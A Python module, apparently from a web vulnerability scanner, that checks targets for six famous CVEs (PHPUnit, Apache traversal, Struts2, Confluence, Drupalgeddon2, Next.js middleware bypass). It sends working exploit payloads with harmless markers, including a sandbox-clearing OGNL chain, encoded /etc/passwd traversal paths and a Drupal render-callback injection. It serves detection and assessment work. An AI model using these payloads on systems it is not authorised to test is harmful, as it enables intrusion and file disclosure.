"""Built-in safe-check probes for famous, high-impact web CVEs.

Every probe is NON-DESTRUCTIVE: it proves exploitability with a benign oracle
(a reflected marker, a computed arithmetic value, or a read of /etc/passwd) and
never runs an OS command, writes a file, or alters state. Each returns a list of
hit dicts; a probe that finds nothing returns []. Probes never raise for a dead
target — transport errors just yield no hit.

Covered:
  CVE-2017-9841  PHPUnit eval-stdin.php RCE            (php)
  CVE-2021-41773 Apache 2.4.49 path traversal / LFI    (apache)
  CVE-2017-5638  Struts2 S2-045 OGNL RCE               (java)
  CVE-2022-26134 Confluence OGNL pre-auth RCE          (java)
  CVE-2018-7600  Drupalgeddon2 RCE                      (php/drupal)
  CVE-2025-29927 Next.js middleware auth bypass         (node/next)
"""
from __future__ import annotations

import os
import random
import re

from . import webhttp


def _tok(prefix: str) -> str:
    return f"EDURECON_{prefix}_{os.urandom(5).hex()}"


def _nums() -> tuple[int, int, int]:
    a, b = random.randint(10000, 99999), random.randint(10000, 99999)
    return a, b, a * b


def _root(base: str) -> str:
    return base.rstrip("/")


# --------------------------------------------------------------------------- #
# CVE-2017-9841 — PHPUnit eval-stdin.php RCE
# --------------------------------------------------------------------------- #
PHPUNIT_PATHS = [
    "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
    "vendor/phpunit/src/Util/PHP/eval-stdin.php",
    "vendor/phpunit/Util/PHP/eval-stdin.php",
    "lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "phpunit/src/Util/PHP/eval-stdin.php",
]


def probe_phpunit(base: str, cfg) -> list[dict]:
    hits: list[dict] = []
    tok = _tok("PU")
    payload = f"<?php echo '{tok}'; ?>"
    for path in PHPUNIT_PATHS:
        url = f"{_root(base)}/{path}"
        st, _h, body = webhttp.request(url, method="POST", raw=payload,
                                       timeout=cfg.http_timeout, ua=cfg.user_agent,
                                       headers={"Content-Type": "text/plain"},
                                       max_bytes=4096)
        if st == 200 and tok in body:
            hits.append({
                "cve": "CVE-2017-9841", "severity": "critical", "confidence": "confirmed",
                "title": "CVE-2017-9841 PHPUnit eval-stdin.php RCE",
                "url": url,
                "evidence": {"marker": tok, "method": "POST php://input",
                             "note": "server echoed the marker => PHP body executed"},
            })
            break  # one confirmed path is enough
    return hits


# --------------------------------------------------------------------------- #
# CVE-2021-41773 / 42013 — Apache path traversal -> LFI (/etc/passwd)
# --------------------------------------------------------------------------- #
TRAVERSAL_PATHS = [
    "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "icons/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
]
_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.S)


def probe_apache_traversal(base: str, cfg) -> list[dict]:
    hits: list[dict] = []
    for path in TRAVERSAL_PATHS:
        url = f"{_root(base)}/{path}"
        st, _h, body = webhttp.request(url, method="GET", timeout=cfg.http_timeout,
                                       ua=cfg.user_agent, max_bytes=8192)
        if st == 200 and _PASSWD_RE.search(body):
            hits.append({
                "cve": "CVE-2021-41773", "severity": "high", "confidence": "confirmed",
                "title": "CVE-2021-41773 Apache path traversal (LFI; RCE if mod_cgi)",
                "url": url,
                "evidence": {"path": "/" + path,
                             "snippet": body[:200].strip()},
            })
            break
    return hits


# --------------------------------------------------------------------------- #
# CVE-2017-5638 — Struts2 S2-045 OGNL RCE (arithmetic reflected in a header)
# --------------------------------------------------------------------------- #
def probe_struts2(base: str, cfg) -> list[dict]:
    a, b, prod = _nums()
    ognl = (
        "%{(#nike='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#res=@org.apache.struts2.ServletActionContext@getResponse())."
        f"(#res.setHeader('X-Edurecon-Chk',''+({a}*{b})))}}"
    )
    url = _root(base) + "/"
    st, hdrs, _b = webhttp.request(url, method="GET", timeout=cfg.http_timeout,
                                   ua=cfg.user_agent,
                                   headers={"Content-Type": ognl}, max_bytes=2048)
    chk = ""
    for k, v in (hdrs or {}).items():
        if k.lower() == "x-edurecon-chk":
            chk = v
            break
    if chk.strip() == str(prod):
        return [{
            "cve": "CVE-2017-5638", "severity": "critical", "confidence": "confirmed",
            "title": "CVE-2017-5638 Apache Struts2 S2-045 OGNL RCE",
            "url": url,
            "evidence": {"computed": f"{a}*{b}={prod}", "reflected_header": "X-Edurecon-Chk",
                         "note": "OGNL evaluated in Content-Type => remote code exec"},
        }]
    return []


# --------------------------------------------------------------------------- #
# CVE-2022-26134 — Atlassian Confluence OGNL pre-auth RCE (arithmetic in Location)
# --------------------------------------------------------------------------- #
def probe_confluence(base: str, cfg) -> list[dict]:
    a, b, prod = _nums()
    # ${<a>*<b>} URL-encoded, wrapped as the classic OGNL-in-path probe.
    url = f"{_root(base)}/%24%7B{a}*{b}%7D/"
    st, hdrs, body = webhttp.request(url, method="GET", timeout=cfg.http_timeout,
                                     ua=cfg.user_agent, max_bytes=2048)
    loc = ""
    for k, v in (hdrs or {}).items():
        if k.lower() == "location":
            loc = v
            break
    if str(prod) in loc or (st == 302 and str(prod) in body):
        return [{
            "cve": "CVE-2022-26134", "severity": "critical", "confidence": "confirmed",
            "title": "CVE-2022-26134 Confluence OGNL pre-auth RCE",
            "url": url,
            "evidence": {"computed": f"{a}*{b}={prod}", "location": loc[:200],
                         "note": "OGNL evaluated in URL path => remote code exec"},
        }]
    return []


# --------------------------------------------------------------------------- #
# CVE-2018-7600 — Drupalgeddon2 (Drupal 8 form-API RCE; benign printf marker)
# --------------------------------------------------------------------------- #
def probe_drupalgeddon2(base: str, cfg) -> list[dict]:
    tok = _tok("DG2")
    url = (_root(base) +
           "/user/register?element_parents=account/mail/%23value"
           "&ajax_form=1&_wrapper_format=drupal_ajax")
    data = {
        "form_id": "user_register_form",
        "_drupal_ajax": "1",
        "mail[#post_render][]": "printf",      # PHP printf, NOT an OS command
        "mail[#type]": "markup",
        "mail[#markup]": tok,
    }
    st, _h, body = webhttp.request(url, method="POST", data=data,
                                   timeout=cfg.http_timeout, ua=cfg.user_agent,
                                   max_bytes=4096)
    if tok in body:
        return [{
            "cve": "CVE-2018-7600", "severity": "critical", "confidence": "confirmed",
            "title": "CVE-2018-7600 Drupalgeddon2 RCE",
            "url": url,
            "evidence": {"marker": tok, "callback": "printf",
                         "note": "form-API #post_render executed our callback"},
        }]
    return []


# --------------------------------------------------------------------------- #
# CVE-2025-29927 — Next.js middleware auth bypass (x-middleware-subrequest)
# --------------------------------------------------------------------------- #
NEXT_PROTECTED = ["dashboard", "admin", "account", "app", "api/me", "profile"]
_BYPASS_HDR = {"x-middleware-subrequest":
               "middleware:middleware:middleware:middleware:middleware"}


def _looks_next(base: str, cfg) -> bool:
    st, hdrs, body = webhttp.request(_root(base) + "/", timeout=cfg.http_timeout,
                                     ua=cfg.user_agent, max_bytes=8192)
    blob = " ".join(f"{k}:{v}" for k, v in (hdrs or {}).items()).lower()
    return ("next.js" in blob or "x-nextjs" in blob or "__next" in body
            or "/_next/" in body)


def probe_nextjs_mw(base: str, cfg) -> list[dict]:
    if not _looks_next(base, cfg):
        return []
    for path in NEXT_PROTECTED:
        url = f"{_root(base)}/{path}"
        st0, h0, _b0 = webhttp.request(url, method="GET", timeout=cfg.http_timeout,
                                       ua=cfg.user_agent, max_bytes=512)
        loc0 = (h0 or {}).get("Location", (h0 or {}).get("location", ""))
        blocked = st0 in (301, 302, 303, 307, 308, 401, 403) and \
            (st0 in (401, 403) or re.search(r"login|signin|auth", loc0, re.I))
        if not blocked:
            continue
        st1, _h1, _b1 = webhttp.request(url, method="GET", timeout=cfg.http_timeout,
                                        ua=cfg.user_agent, headers=_BYPASS_HDR,
                                        max_bytes=512)
        if st1 == 200:
            return [{
                "cve": "CVE-2025-29927", "severity": "high", "confidence": "high",
                "title": "CVE-2025-29927 Next.js middleware auth bypass",
                "url": url,
                "evidence": {"without_header": st0, "with_header": st1,
                             "header": "x-middleware-subrequest",
                             "note": "protected route opened once middleware was skipped"},
            }]
    return []


# --------------------------------------------------------------------------- #
# dispatcher
# --------------------------------------------------------------------------- #
_PROBES = [
    ("webcve_phpunit", probe_phpunit),
    ("webcve_apache_traversal", probe_apache_traversal),
    ("webcve_struts2", probe_struts2),
    ("webcve_confluence", probe_confluence),
    ("webcve_drupalgeddon2", probe_drupalgeddon2),
    ("webcve_nextjs_mw", probe_nextjs_mw),
]


def run_probes(base: str, cfg, aborted=lambda: False) -> list[dict]:
    """Run every enabled CVE probe against one base URL; collect hits."""
    out: list[dict] = []
    for flag, fn in _PROBES:
        if aborted():
            break
        if not getattr(cfg, flag, True):
            continue
        try:
            out.extend(fn(base, cfg))
        except Exception:
            continue  # a probe must never abort the stage
    return out
